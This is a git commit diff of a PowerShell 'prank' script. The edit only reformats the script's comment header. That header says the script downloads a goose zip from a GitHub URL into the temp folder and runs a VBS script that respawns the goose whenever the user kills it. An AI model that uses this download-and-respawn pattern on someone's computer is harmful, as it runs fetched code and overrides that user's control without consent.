7de0b191ec53066e69087fd9e1405457a0411356
egieb <93350544+beigeworm@users.noreply.github.com>
2024-03-13 14:29:07 +0000

    Update Persistant-Goose.ps1

--- Pranks/Persistant-Goose.ps1
+++ Pranks/Persistant-Goose.ps1
@@ -1,13 +1,8 @@
-<#=============== Persisant Goose Prank =======================
-
+<# ================== Persisant Goose Prank =======================
 SYNOPSIS
 Spawn an annoying goose and replace it if it's killed by the user.
-
 Downloads a goose zip file and extracts contents to the temp folder then starts a vbs script that spawns goose 30 secs after its killed.
-
-
 #>
-
 
 $url = "https://github.com/beigeworm/assets/raw/main/Goose.zip"
 $tempFolder = $env:TMP
